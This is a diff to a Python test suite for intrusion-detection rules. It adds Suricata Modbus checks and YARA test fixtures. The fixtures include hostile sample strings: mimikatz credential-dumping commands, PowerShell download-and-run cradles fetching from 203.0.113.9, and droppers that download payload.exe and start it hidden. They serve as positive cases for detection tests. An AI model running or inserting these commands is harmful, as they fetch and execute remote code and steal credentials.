@@ -306,6 +306,13 @@ class SuricataRules(unittest.TestCase):
             if line.startswith("alert dnp3"):
                 self.assertRegex(line, r"dnp3_(func|ind):[a-z_]+;", f"{name}:{number}")
 
+    def test_modbus_subfunction_is_only_written_for_function_8(self):
+        # Suricata compares "subfunction" for the Diagnostics function only (8.0,
+        # rust/src/modbus/detect.rs). With any other function the rule loads and never matches.
+        for name, number, line in self.RULES:
+            for function in re.findall(r"modbus: (?:unit \d+, )?function (\d+), subfunction \d+", line):
+                self.assertEqual(function, "8", f"{name}:{number}: 'subfunction' never matches function {function}")
+
 
 def _payload_matches(options, payload):
     """Evaluate the byte-position options these rules use against one request:
@@ -373,6 +380,18 @@ class SuricataBytePositions(unittest.TestCase):
             for payload in negatives:
                 self.assertFalse(_payload_matches(self.options(sid), payload), sid)
 
+    def test_modbus_read_device_identification(self):
+        # MBAP header (7 bytes: transaction, protocol 0, length, unit), then function 43 and interface type 14.
+        identify = bytes.fromhex("0001" "0000" "0005" "01" "2b" "0e" "0100")
+        canopen = bytes.fromhex("0001" "0000" "0007" "01" "2b" "0d" "0000000000")
+        refused = bytes.fromhex("0001" "0000" "0003" "01" "ab" "01")
+        read = bytes.fromhex("0001" "0000" "0006" "01" "03" "2b0e" "0002")
+        options = self.options(1900103)
+        self.assertRegex(options, r"^alert tcp any any -> any 502 \(")
+        self.assertTrue(_payload_matches(options, identify))
+        for payload in (canopen, refused, read):
+            self.assertFalse(_payload_matches(options, payload), payload.hex())
+
     def test_iec104_reset_process(self):
         options = self.options(1900161)
         self.assertTrue(_payload_matches(options, self.IEC_RESET))
@@ -419,8 +438,13 @@ class YaraRules(unittest.TestCase):
             [b"privilege::debug\nsekurlsa::logonpasswords\nexit\n", b"MZ" + b"\x00" * 64 + b"mimikatz 2.2.0 gentilkiwi lsadump::sam"],
             [b"notes about the mimikatz tool, by gentilkiwi", b"privilege::debug only"]),
         "TechDetechtives_PowerShell_Download_And_Run": (
-            [b"IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.9/a.ps1')"],
-            [b"(New-Object Net.WebClient).DownloadString('http://203.0.113.9/a.txt') | Out-File a.txt", b"Invoke-Expression 'Get-Date'"]),
+            [b"IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.9/a.ps1')",
+             # a dropper: a program fetched by name and started
+             b"(New-Object Net.WebClient).DownloadFile('http://203.0.113.9/payload.exe', \"$env:TEMP\\p.exe\"); Start-Process \"$env:TEMP\\p.exe\"",
+             b"$c = New-Object Net.WebClient\n$c.DownloadFile('https://files.example.net/get?id=7', $t)\nStart-Process $t -WindowStyle Hidden\n"],
+            [b"(New-Object Net.WebClient).DownloadString('http://203.0.113.9/a.txt') | Out-File a.txt", b"Invoke-Expression 'Get-Date'",
+             # what an ordinary set-up script does: fetch an installer, start it
+             b"$url = 'https://dl.example.com/setup.msi'\n$wc = New-Object net.webclient\n$wc.Downloadfile($url, $msi)\nStart-Process msiexec.exe -ArgumentList $a -Wait\n"]),
         "TechDetechtives_PowerShell_Encoded_Launcher": (
             [b"@echo off\npowershell.exe -nop -enc " + b"SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA" * 3 + b"\n"],
             [b"powershell.exe -ExecutionPolicy Bypass -File setup.ps1", b"powershell -e short"]),
